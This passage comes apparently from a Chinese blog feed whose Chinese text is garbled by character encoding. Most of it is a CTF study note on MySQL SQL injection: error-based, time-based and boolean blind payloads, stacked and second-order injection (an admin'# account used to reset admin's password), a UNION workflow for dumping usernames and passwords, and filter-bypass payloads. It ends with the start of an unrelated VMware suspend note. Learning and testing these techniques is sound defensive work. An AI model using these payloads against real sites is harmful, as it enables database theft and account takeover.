<li>mid(a,b,c)ä»ä½ç½® b å¼€å§‹ï¼Œæˆªå– a å­—ç¬¦ä¸²çš„ c ä½</li>
<li>Ord()å‡½æ•°åŒ ascii()ï¼Œå°†å­—ç¬¦è½¬ä¸º ascii å€¼</li>
</ul>
</li>
<li><p>â–²regexp æ­£åˆ™æ³¨å…¥</p>
<p>æ­£åˆ™æ³¨å…¥ä»‹ç»ï¼š</p>
<p><a href="http://www.cnblogs.com/lcamry/articles/5717442.html">http://www.cnblogs.com/lcamry/articles/5717442.html</a></p>
<p>ç”¨æ³•ä»‹ç»ï¼šselect user() regexp â€˜^[a-z]â€™;</p>
<p>Explainï¼š</p>
<ul>
<li>æ­£åˆ™è¡¨è¾¾å¼çš„ç”¨æ³•ï¼Œuser()ç»“æœä¸º rootï¼Œregexp ä¸ºåŒ¹é… root çš„æ­£åˆ™è¡¨è¾¾å¼ã€‚ç¬¬äºŒä½å¯ä»¥ç”¨ select user() regexp â€˜^roâ€™æ¥è¿›è¡Œã€‚</li>
</ul>
</li>
</ul>
<h5 id="åŸºäºæŠ¥é”™"><a href="#åŸºäºæŠ¥é”™" class="headerlink" title="åŸºäºæŠ¥é”™"></a>åŸºäºæŠ¥é”™</h5><p>â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”æ„é€ payload è®©ä¿¡æ¯é€šè¿‡é”™è¯¯æç¤ºå›æ˜¾å‡ºæ¥â€”â€”â€”â€”â€”â€”</p>
<ul>
<li><p>select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;<br>Explain:æ­¤å¤„æœ‰ä¸‰ä¸ªç‚¹ï¼Œ</p>
<ul>
<li>ä¸€æ˜¯éœ€è¦ concat è®¡æ•°ï¼Œ</li>
<li>äºŒæ˜¯ floorï¼Œå–å¾— 0 or 1ï¼Œè¿›è¡Œæ•°æ®çš„é‡å¤ï¼Œ</li>
<li>ä¸‰æ˜¯ group by è¿›è¡Œåˆ†ç»„ï¼Œä½†å…·ä½“åŸç†è§£é‡Šä¸æ˜¯å¾ˆé€šï¼Œå¤§è‡´åŸç†ä¸ºåˆ†ç»„åæ•°æ®è®¡æ•°æ—¶<br>é‡å¤é€ æˆçš„é”™è¯¯ã€‚ä¹Ÿæœ‰è§£é‡Šä¸º mysql çš„ bug çš„é—®é¢˜ã€‚</li>
<li>ä½†æ˜¯æ­¤å¤„éœ€è¦å°† rand(0)ï¼Œrand()éœ€<br>è¦å¤šè¯•å‡ æ¬¡æ‰è¡Œã€‚</li>
<li>ä»¥ä¸Šè¯­å¥å¯ä»¥ç®€åŒ–æˆå¦‚ä¸‹çš„å½¢å¼ã€‚<br>select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</li>
<li>å¦‚æœ rand è¢«ç¦ç”¨äº†å¯ä»¥ä½¿ç”¨ç”¨æˆ·å˜é‡æ¥æŠ¥é”™<br>select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</li>
</ul>
</li>
<li><p>select exp(~(select * FROM(SELECT USER())a)) //double æ•°å€¼ç±»å‹è¶…å‡ºèŒƒå›´<br>//Exp()ä¸ºä»¥ e ä¸ºåº•çš„å¯¹æ•°å‡½æ•°ï¼›ç‰ˆæœ¬åœ¨ 5.5.5 åŠå…¶ä»¥ä¸Š<br>å¯ä»¥å‚è€ƒ exp æŠ¥é”™æ–‡ç« ï¼š<a href="http://www.cnblogs.com/lcamry/articles/5509124.html">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p>
</li>
<li><p>select !(select * from (select user())x) -ï¼ˆps:è¿™æ˜¯å‡å·ï¼‰ <del>0<br>//bigint è¶…å‡ºèŒƒå›´ï¼›</del>0 æ˜¯å¯¹ 0 é€ä½å–åï¼Œå¾ˆå¤§çš„ç‰ˆæœ¬åœ¨ 5.5.5 åŠå…¶ä»¥ä¸Š</p>
<p>å¯ä»¥å‚è€ƒæ–‡ç«  bigint æº¢å‡ºæ–‡ç«  <a href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p>
</li>
<li><p>extractvalue(1,concat(0x7e,(select @@version),0x7e))</p>
<p>//mysql å¯¹ xml æ•°æ®è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„ xpath å‡½æ•°ï¼Œxpath è¯­æ³•é”™è¯¯,32ä½å­—ç¬¦é™åˆ¶</p>
</li>
<li><p>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</p>
<p>//mysql å¯¹ xml æ•°æ®è¿›è¡ŒæŸ¥è¯¢å’Œä¿®æ”¹çš„ xpath å‡½æ•°ï¼Œxpath è¯­æ³•é”™è¯¯,32ä½å­—ç¬¦é™åˆ¶</p>
</li>
<li><p>select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;<br>//mysql é‡å¤ç‰¹æ€§ï¼Œæ­¤å¤„é‡å¤äº† versionï¼Œæ‰€ä»¥æŠ¥é”™</p>
</li>
</ul>
<h6 id="æŠ¥é”™æ³¨å…¥æ€»ç»“å’Œç¤ºä¾‹"><a href="#æŠ¥é”™æ³¨å…¥æ€»ç»“å’Œç¤ºä¾‹" class="headerlink" title="æŠ¥é”™æ³¨å…¥æ€»ç»“å’Œç¤ºä¾‹"></a>æŠ¥é”™æ³¨å…¥æ€»ç»“å’Œç¤ºä¾‹</h6><ul>
<li>floor()å’Œrand()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a       &#x2F;*åˆ©ç”¨é”™è¯¯ä¿¡æ¯å¾—åˆ°å½“å‰æ•°æ®åº“å*&#x2F;</span><br></pre></td></tr></table></figure>
<ul>
<li>extractvalue()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
<ul>
<li>updatexml()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br></pre></td></tr></table></figure>
<ul>
<li>geometrycollection()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and geometrycollection((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>multipoint()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and multipoint((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>polygon()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and polygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>multipolygon()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and multipolygon((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>linestring()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and linestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>multilinestring()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and multilinestring((select * from(select * from(select user())a)b))</span><br></pre></td></tr></table></figure>
<ul>
<li>exp()</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and exp(~(select * from(select user())a))</span><br></pre></td></tr></table></figure>
<h5 id="åŸºäºæ—¶é—´"><a href="#åŸºäºæ—¶é—´" class="headerlink" title="åŸºäºæ—¶é—´"></a>åŸºäºæ—¶é—´</h5><ul>
<li>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23 //if åˆ¤æ–­è¯­å¥ï¼Œ æ¡ä»¶ä¸ºå‡ï¼Œæ‰§è¡Œ sleep<br>Psï¼š é‡åˆ°ä»¥ä¸‹è¿™ç§åˆ©ç”¨ sleep()å»¶æ—¶æ³¨å…¥è¯­å¥<br>select sleep(find_in_set(mid(@@version, 1, 1), â€˜0,1,2,3,4,5,6,7,8,9,.â€™));<br>è¯¥è¯­å¥æ„æ€æ˜¯åœ¨ 0-9 ä¹‹é—´æ‰¾ç‰ˆæœ¬å·çš„ç¬¬ä¸€ä½ã€‚ ä½†æ˜¯åœ¨æˆ‘ä»¬å®é™…æ¸—é€è¿‡ç¨‹ä¸­ï¼Œ è¿™ç§ç”¨æ³•æ˜¯ä¸å¯å–çš„ï¼Œå› ä¸ºæ—¶é—´ä¼šæœ‰ç½‘é€Ÿç­‰å…¶ä»–å› ç´ çš„å½±å“ï¼Œæ‰€ä»¥ä¼šå½±å“ç»“æœçš„åˆ¤æ–­ã€‚</li>
<li>UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(â€˜MSGâ€™,â€™by 5 secondsâ€™)),null) FROM (select database() as current) as tb1;<br>//BENCHMARK(count,expr)ç”¨äºæµ‹è¯•å‡½æ•°çš„æ€§èƒ½ï¼Œå‚æ•°ä¸€ä¸ºæ¬¡æ•°ï¼ŒäºŒä¸ºè¦æ‰§è¡Œçš„è¡¨è¾¾å¼ã€‚å¯ä»¥è®©å‡½æ•°æ‰§è¡Œè‹¥å¹²æ¬¡ï¼Œè¿”å›ç»“æœæ¯”å¹³æ—¶è¦é•¿ï¼Œé€šè¿‡æ—¶é—´é•¿çŸ­çš„å˜åŒ–ï¼Œåˆ¤æ–­è¯­å¥æ˜¯å¦æ‰§è¡ŒæˆåŠŸã€‚è¿™æ˜¯ä¸€ç§è¾¹ä¿¡é“æ”»å‡»ï¼Œåœ¨è¿è¡Œè¿‡ç¨‹ä¸­å ç”¨å¤§é‡çš„ cpu èµ„æºã€‚æ¨èä½¿ç”¨ sleep()</li>
</ul>
<h4 id="å †å æŸ¥è¯¢æ³¨å…¥"><a href="#å †å æŸ¥è¯¢æ³¨å…¥" class="headerlink" title="å †å æŸ¥è¯¢æ³¨å…¥"></a>å †å æŸ¥è¯¢æ³¨å…¥</h4><p><strong>å±€é™æ€§</strong></p>
<p>å †å æ³¨å…¥çš„å±€é™æ€§åœ¨äºå¹¶ä¸æ˜¯æ¯ä¸€ä¸ªç¯å¢ƒä¸‹éƒ½å¯ä»¥æ‰§è¡Œï¼Œ å¯èƒ½å—åˆ° API æˆ–è€…æ•°æ®åº“å¼•æ“ä¸æ”¯æŒçš„é™åˆ¶ï¼Œå½“ç„¶äº†æƒé™ä¸è¶³ä¹Ÿå¯ä»¥è§£é‡Šä¸ºä»€ä¹ˆæ”»å‡»è€…æ— æ³•ä¿®æ”¹æ•°æ®æˆ–è€…è°ƒç”¨ä¸€äº›ç¨‹åº</p>
<p><strong>åŸç†</strong></p>
<p>åˆ©ç”¨åˆ†å·ç»“æŸä¸€å¥æ‰§è¡Œ,ä»è€Œæ„é€ å¤šè¡Œè¯­å¥è¿›è¡Œæ³¨å…¥æ”»å‡»</p>
<h2 id="æŒ‰æ³¨å…¥çš„ç¨‹åº¦å’Œé¡ºåº"><a href="#æŒ‰æ³¨å…¥çš„ç¨‹åº¦å’Œé¡ºåº" class="headerlink" title="æŒ‰æ³¨å…¥çš„ç¨‹åº¦å’Œé¡ºåº"></a>æŒ‰æ³¨å…¥çš„ç¨‹åº¦å’Œé¡ºåº</h2><h3 id="ä¸€é˜¶æ³¨å…¥"><a href="#ä¸€é˜¶æ³¨å…¥" class="headerlink" title="ä¸€é˜¶æ³¨å…¥"></a>ä¸€é˜¶æ³¨å…¥</h3><p>å³ç›´æ¥æ³¨å…¥ï¼ŒæŸ¥çœ‹ä¸Šè¿°æ‰€æœ‰</p>
<h3 id="äºŒé˜¶æ³¨å…¥ï¼ˆäºŒæ¬¡æ³¨å…¥ï¼‰"><a href="#äºŒé˜¶æ³¨å…¥ï¼ˆäºŒæ¬¡æ³¨å…¥ï¼‰" class="headerlink" title="äºŒé˜¶æ³¨å…¥ï¼ˆäºŒæ¬¡æ³¨å…¥ï¼‰"></a>äºŒé˜¶æ³¨å…¥ï¼ˆäºŒæ¬¡æ³¨å…¥ï¼‰</h3><p>1ã€é»‘å®¢é€šè¿‡æ„é€ æ•°æ®çš„å½¢å¼ï¼Œåœ¨æµè§ˆå™¨æˆ–è€…å…¶ä»–è½¯ä»¶ä¸­æäº¤ HTTP æ•°æ®æŠ¥æ–‡è¯·æ±‚åˆ°æœåŠ¡<br>ç«¯è¿›è¡Œå¤„ç†ï¼Œæäº¤çš„æ•°æ®æŠ¥æ–‡è¯·æ±‚ä¸­å¯èƒ½åŒ…å«äº†é»‘å®¢æ„é€ çš„ SQL è¯­å¥æˆ–è€…å‘½ä»¤ã€‚</p>
<p>2ã€æœåŠ¡ç«¯åº”ç”¨ç¨‹åºä¼šå°†é»‘å®¢æäº¤çš„æ•°æ®ä¿¡æ¯è¿›è¡Œå­˜å‚¨ï¼Œ é€šå¸¸æ˜¯ä¿å­˜åœ¨æ•°æ®åº“ä¸­ï¼Œ ä¿å­˜çš„<br>æ•°æ®ä¿¡æ¯çš„ä¸»è¦ä½œç”¨æ˜¯ä¸ºåº”ç”¨ç¨‹åºæ‰§è¡Œå…¶ä»–åŠŸèƒ½æä¾›åŸå§‹è¾“å…¥æ•°æ®å¹¶å¯¹å®¢æˆ·ç«¯è¯·æ±‚åšå‡ºå“<br>åº”ã€‚</p>
<p>3ã€é»‘å®¢å‘æœåŠ¡ç«¯å‘é€ç¬¬äºŒä¸ªä¸ç¬¬ä¸€æ¬¡ä¸ç›¸åŒçš„è¯·æ±‚æ•°æ®ä¿¡æ¯ã€‚</p>
<p>4ã€æœåŠ¡ç«¯æ¥æ”¶åˆ°é»‘å®¢æäº¤çš„ç¬¬äºŒä¸ªè¯·æ±‚ä¿¡æ¯åï¼Œ ä¸ºäº†å¤„ç†è¯¥è¯·æ±‚ï¼Œ æœåŠ¡ç«¯ä¼šæŸ¥è¯¢æ•°æ®åº“<br>ä¸­å·²ç»å­˜å‚¨çš„æ•°æ®ä¿¡æ¯å¹¶å¤„ç†ï¼Œ ä»è€Œå¯¼è‡´é»‘å®¢åœ¨ç¬¬ä¸€æ¬¡è¯·æ±‚ä¸­æ„é€ çš„ SQL è¯­å¥æˆ–è€…å‘½ä»¤åœ¨æœ<br>åŠ¡ç«¯ç¯å¢ƒä¸­æ‰§è¡Œã€‚</p>
<p>5ã€æœåŠ¡ç«¯è¿”å›æ‰§è¡Œçš„å¤„ç†ç»“æœæ•°æ®ä¿¡æ¯ï¼Œ é»‘å®¢å¯ä»¥é€šè¿‡è¿”å›çš„ç»“æœæ•°æ®ä¿¡æ¯åˆ¤æ–­äºŒæ¬¡æ³¨<br>å…¥æ¼æ´åˆ©ç”¨æ˜¯å¦æˆåŠŸã€‚<br>ä¾‹ï¼š</p>
<p>å…ˆæ³¨å†Œä¸€ä¸ª adminâ€™#çš„è´¦å·ï¼Œæ¥ä¸‹æ¥ç™»å½•è¯¥å¸å·åè¿›è¡Œä¿®æ”¹å¯†ç ã€‚æ­¤æ—¶ä¿®æ”¹çš„å°±æ˜¯ admin çš„å¯†ç ã€‚<br>Sql è¯­å¥å˜ä¸º UPDATE users SET passwd=â€New_Passâ€ WHERE username =â€™ adminâ€™ # â€˜ AND<br>password=â€™ ï¼Œ ä¹Ÿ å°± æ˜¯ æ‰§ è¡Œ äº† UPDATE users SET passwd=â€New_Passâ€ WHERE username =â€™<br>adminâ€™</p>
<h2 id="0x03-åŸºæœ¬æ‰‹å·¥æ³¨å…¥æµç¨‹"><a href="#0x03-åŸºæœ¬æ‰‹å·¥æ³¨å…¥æµç¨‹" class="headerlink" title="0x03 åŸºæœ¬æ‰‹å·¥æ³¨å…¥æµç¨‹"></a>0x03 åŸºæœ¬æ‰‹å·¥æ³¨å…¥æµç¨‹</h2><p>è¦ä»selectè¯­å¥ä¸­è·å¾—æœ‰ç”¨çš„ä¿¡æ¯ï¼Œå¿…é¡»ç¡®å®šè¯¥æ•°æ®åº“ä¸­çš„å­—æ®µæ•°å’Œé‚£ä¸ªå­—æ®µèƒ½å¤Ÿè¾“å‡ºï¼Œè¿™æ˜¯å‰æã€‚</p>
<h3 id="1ã€MySQL-gt-5-0"><a href="#1ã€MySQL-gt-5-0" class="headerlink" title="1ã€MySQL &gt;= 5.0"></a>1ã€MySQL &gt;= 5.0</h3><h4 id="ï¼ˆ1ï¼‰è·å–å­—æ®µæ•°"><a href="#ï¼ˆ1ï¼‰è·å–å­—æ®µæ•°" class="headerlink" title="ï¼ˆ1ï¼‰è·å–å­—æ®µæ•°"></a>ï¼ˆ1ï¼‰è·å–å­—æ®µæ•°</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">order by n  &#x2F;*é€šè¿‡ä¸æ–­å°è¯•æ”¹å˜nçš„å€¼æ¥è§‚å¯Ÿé¡µé¢ååº”ç¡®å®šå­—æ®µæ•°*&#x2F;</span><br></pre></td></tr></table></figure>
<h4 id="ï¼ˆ2ï¼‰è·å–ç³»ç»Ÿæ•°æ®åº“å"><a href="#ï¼ˆ2ï¼‰è·å–ç³»ç»Ÿæ•°æ®åº“å" class="headerlink" title="ï¼ˆ2ï¼‰è·å–ç³»ç»Ÿæ•°æ®åº“å"></a>ï¼ˆ2ï¼‰è·å–ç³»ç»Ÿæ•°æ®åº“å</h4><p>åœ¨MySQL &gt;5.0ä¸­ï¼Œæ•°æ®åº“åå­˜æ”¾åœ¨information_schemaæ•°æ®åº“ä¸‹schemataè¡¨schema_nameå­—æ®µä¸­</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure>
<h4 id="ï¼ˆ3ï¼‰è·å–å½“å‰æ•°æ®åº“å"><a href="#ï¼ˆ3ï¼‰è·å–å½“å‰æ•°æ®åº“å" class="headerlink" title="ï¼ˆ3ï¼‰è·å–å½“å‰æ•°æ®åº“å"></a>ï¼ˆ3ï¼‰è·å–å½“å‰æ•°æ®åº“å</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,database()</span><br></pre></td></tr></table></figure>
<h4 id="ï¼ˆ4ï¼‰è·å–æ•°æ®åº“ä¸­çš„è¡¨"><a href="#ï¼ˆ4ï¼‰è·å–æ•°æ®åº“ä¸­çš„è¡¨" class="headerlink" title="ï¼ˆ4ï¼‰è·å–æ•°æ®åº“ä¸­çš„è¡¨"></a>ï¼ˆ4ï¼‰è·å–æ•°æ®åº“ä¸­çš„è¡¨</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()</span><br></pre></td></tr></table></figure>
<p>æˆ–</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1</span><br></pre></td></tr></table></figure>
<h4 id="ï¼ˆ5ï¼‰è·å–è¡¨ä¸­çš„å­—æ®µ"><a href="#ï¼ˆ5ï¼‰è·å–è¡¨ä¸­çš„å­—æ®µ" class="headerlink" title="ï¼ˆ5ï¼‰è·å–è¡¨ä¸­çš„å­—æ®µ"></a>ï¼ˆ5ï¼‰è·å–è¡¨ä¸­çš„å­—æ®µ</h4><p>è¿™é‡Œå‡è®¾å·²ç»è·å–åˆ°è¡¨åä¸ºuser</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,null,...,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;users&#39;</span><br></pre></td></tr></table></figure>
<h4 id="ï¼ˆ6ï¼‰è·å–å„ä¸ªå­—æ®µå€¼"><a href="#ï¼ˆ6ï¼‰è·å–å„ä¸ªå­—æ®µå€¼" class="headerlink" title="ï¼ˆ6ï¼‰è·å–å„ä¸ªå­—æ®µå€¼"></a>ï¼ˆ6ï¼‰è·å–å„ä¸ªå­—æ®µå€¼</h4><p>è¿™é‡Œå‡è®¾å·²ç»è·å–åˆ°è¡¨åä¸ºuserï¼Œä¸”å­—æ®µä¸ºusernameå’Œpassword</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select null,group_concat(username,password) from users</span><br></pre></td></tr></table></figure>
<h3 id="2ã€MySQL-lt-5-0"><a href="#2ã€MySQL-lt-5-0" class="headerlink" title="2ã€MySQL &lt; 5.0"></a>2ã€MySQL &lt; 5.0</h3><p>MySQL &lt; 5.0 æ²¡æœ‰ä¿¡æ¯æ•°æ®åº“<strong>information_schema</strong>ï¼Œæ‰€ä»¥åªèƒ½æ‰‹å·¥æšä¸¾çˆ†ç ´ï¼ˆäºŒåˆ†æ³•æ€æƒ³ï¼‰ã€‚</p>
<p>è¯¥æ–¹å¼é€šå¸¸ç”¨äºç›²æ³¨ã€‚</p>
<h3 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h3><p><strong>length(str)</strong> ï¼šè¿”å›å­—ç¬¦ä¸²strçš„é•¿åº¦</p>
<p><strong>substr(str, pos, len)</strong> ï¼šå°†strä»posä½ç½®å¼€å§‹æˆªå–lené•¿åº¦çš„å­—ç¬¦è¿›è¡Œè¿”å›ã€‚æ³¨æ„è¿™é‡Œçš„posä½ç½®æ˜¯ä»1å¼€å§‹çš„ï¼Œä¸æ˜¯æ•°ç»„çš„0å¼€å§‹</p>
<p><strong>mid(str,pos,len)</strong> ï¼šè·Ÿä¸Šé¢çš„ä¸€æ ·ï¼Œæˆªå–å­—ç¬¦ä¸²</p>
<p><strong>ascii(str)</strong> ï¼šè¿”å›å­—ç¬¦ä¸²strçš„æœ€å·¦é¢å­—ç¬¦çš„ASCIIä»£ç å€¼</p>
<p><strong>ord(str)</strong> ï¼šå°†å­—ç¬¦æˆ–å¸ƒå°”ç±»å‹è½¬æˆascllç </p>
<p><strong>if(a,b,c)</strong> ï¼šaä¸ºæ¡ä»¶ï¼Œaä¸ºtrueï¼Œè¿”å›bï¼Œå¦åˆ™è¿”å›cï¼Œå¦‚if(1&gt;2,1,0),è¿”å›0</p>
<h4 id="ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨"><a href="#ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨" class="headerlink" title="ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨"></a>ï¼ˆ1ï¼‰åŸºäºå¸ƒå°”çš„ç›²æ³¨</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">and ascii(substr((select database()),1,1))&gt;64 &#x2F;*åˆ¤æ–­æ•°æ®åº“åçš„ç¬¬ä¸€ä¸ªå­—ç¬¦çš„asciiå€¼æ˜¯å¦å¤§äº64*&#x2F;</span><br></pre></td></tr></table></figure>
<h4 id="ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨"><a href="#ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨" class="headerlink" title="ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨"></a>ï¼ˆ2ï¼‰åŸºäºæ—¶é—´çš„ç›²æ³¨</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 union select if(SUBSTRING(user(),1,4)&#x3D;&#39;root&#39;,sleep(4),1),null,null &#x2F;*æå–ç”¨æˆ·åå‰å››ä¸ªå­—ç¬¦åšåˆ¤æ–­ï¼Œæ­£ç¡®å°±å»¶è¿Ÿ4ç§’ï¼Œé”™è¯¯è¿”å›1*&#x2F;</span><br></pre></td></tr></table></figure>
<h2 id="0x04SQLæ³¨å…¥ç»•è¿‡æŠ€æœ¯"><a href="#0x04SQLæ³¨å…¥ç»•è¿‡æŠ€æœ¯" class="headerlink" title="0x04SQLæ³¨å…¥ç»•è¿‡æŠ€æœ¯"></a>0x04SQLæ³¨å…¥ç»•è¿‡æŠ€æœ¯</h2><ul>
<li><p><strong>å¤§å°å†™ç»•è¿‡</strong></p>
</li>
<li><p><strong>åŒå†™ç»•è¿‡</strong></p>
</li>
<li><p><strong>ç¼–ç ç»•è¿‡</strong>ï¼ˆurlå…¨ç¼–ç ã€åå…­è¿›åˆ¶ï¼‰</p>
</li>
<li><p><strong>å†…è”æ³¨é‡Šç»•è¿‡</strong></p>
</li>
<li><p><strong>å…³é”®å­—æ›¿æ¢</strong></p>
<ul>
<li><p><strong>é€—å·ç»•è¿‡</strong></p>
<p>substrã€mid()å‡½æ•°ä¸­å¯ä»¥åˆ©ç”¨from toæ¥æ‘†è„±å¯¹é€—å·çš„åˆ©ç”¨ï¼›</p>
<p>limitä¸­å¯ä»¥åˆ©ç”¨offsetæ¥æ‘†è„±å¯¹é€—å·çš„åˆ©ç”¨</p>
</li>
<li><p><strong>æ¯”è¾ƒç¬¦å·( &gt;ã€&lt; )ç»•è¿‡</strong>ï¼ˆgreatestã€between and)</p>
</li>
<li><p><strong>é€»è¾‘ç¬¦å·çš„æ›¿æ¢</strong>ï¼ˆand=&amp;&amp; or=|| xor=| not=!ï¼‰</p>
</li>
<li><p><strong>ç©ºæ ¼ç»•è¿‡</strong>ï¼ˆç”¨æ‹¬å·ï¼Œ+ç­‰ç»•è¿‡ï¼‰</p>
</li>
</ul>
</li>
<li><p><strong>ç­‰ä»·å‡½æ•°ç»•è¿‡</strong></p>
<ul>
<li>hex()ã€bin()=ascii()</li>
<li>concat_ws()=group_concat()</li>
<li>mid()ã€substr()=substring()</li>
</ul>
</li>
<li><p><strong>httpå‚æ•°æ±¡æŸ“</strong></p>
<p><code>id=1 union select+1,2,3+from+users+where+id=1â€“</code></p>
<p>å˜ä¸º</p>
<p><code>id=1 union select+1&amp;id=2,3+from+users+where+id=1â€“</code></p>
</li>
<li><p><strong>ç¼“å†²åŒºæº¢å‡ºç»•è¿‡</strong></p>
<p>(id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36â€“+</p>
<p>å…¶ä¸­0xAAAAAAAAAAAAAAAAAAAAAè¿™é‡ŒAè¶Šå¤šè¶Šå¥½ã€‚ã€‚ä¸€èˆ¬ä¼šå­˜åœ¨ä¸´ç•Œå€¼ï¼Œå…¶å®è¿™ç§æ–¹æ³•è¿˜å¯¹åç¼€åçš„ç»•è¿‡ä¹Ÿæœ‰ç”¨)</p>
</li>
<li><p>ä¸ç”¨or and æ¥è¿›è¡Œboolç›²æ³¨</p>
<p>åŸç†</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1^1^1</span><br><span class="line">&#x3D;&gt;id&#x3D;1</span><br></pre></td></tr></table></figure>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;0&#125;,1))&#x3D;&#123;1&#125;)^1&quot;</span><br><span class="line">#çˆ†åº“</span><br><span class="line">1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)&#x3D;&#39;geek&#39;),%s,1))&#x3D;%s)^1</span><br><span class="line">#çˆ†å­—æ®µ</span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
        <category>sql</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title>è™šæ‹ŸæœºæŒ‚èµ·æ— æ³•æ¢å¤</title>
    <url>/2020/01/16/Note/%E8%99%9A%E6%8B%9F%E6%9C%BA%E6%8C%82%E8%B5%B7%E6%97%A0%E6%B3%95%E6%81%A2%E5%A4%8D/</url>
    <content><![CDATA[<h1 id="è™šæ‹ŸæœºæŒ‚èµ·æ— æ³•æ¢å¤"><a href="#è™šæ‹ŸæœºæŒ‚èµ·æ— æ³•æ¢å¤" class="headerlink" title="è™šæ‹ŸæœºæŒ‚èµ·æ— æ³•æ¢å¤"></a>è™šæ‹ŸæœºæŒ‚èµ·æ— æ³•æ¢å¤</h1><h2 id="æŒ‚èµ·"><a href="#æŒ‚èµ·" class="headerlink" title="æŒ‚èµ·"></a>æŒ‚èµ·</h2><p>vmware æ”¯æŒå‡ ç§å·¥ä½œçŠ¶æ€:å…³æœºï¼ŒæŒ‚èµ·ï¼Œé‡æ–°å¯åŠ¨</p>
<p><strong>æŒ‚èµ·</strong>ï¼šä¸‹æ¬¡æ‰“å¼€è™šæ‹Ÿæœºä¼šè¿˜åŸåˆ°æŒ‚èµ·æ—¶è™šæ‹Ÿæœºçš„çŠ¶æ€</p>
<a id="more"></a>

<h2 id="å¦‚ä½•åšåˆ°ï¼Ÿ"><a href="#å¦‚ä½•åšåˆ°ï¼Ÿ" class="headerlink" title="å¦‚ä½•åšåˆ°ï¼Ÿ"></a>å¦‚ä½•åšåˆ°ï¼Ÿ</h2><p>ä¸ºäº†ä¿å­˜æŒ‚èµ·æ—¶è™šæ‹ŸæœºçŠ¶æ€ï¼Œä¼šåœ¨è™šæ‹Ÿæœºæ–‡ä»¶å¤¹åˆ›å»ºä¸€ä¸ªvmessåç¼€çš„æ–‡ä»¶ï¼Œ è¿™ä¸ªæ–‡ä»¶è®°å½•äº†è™šæ‹ŸæœºæŒ‚èµ·çŠ¶æ€</p>
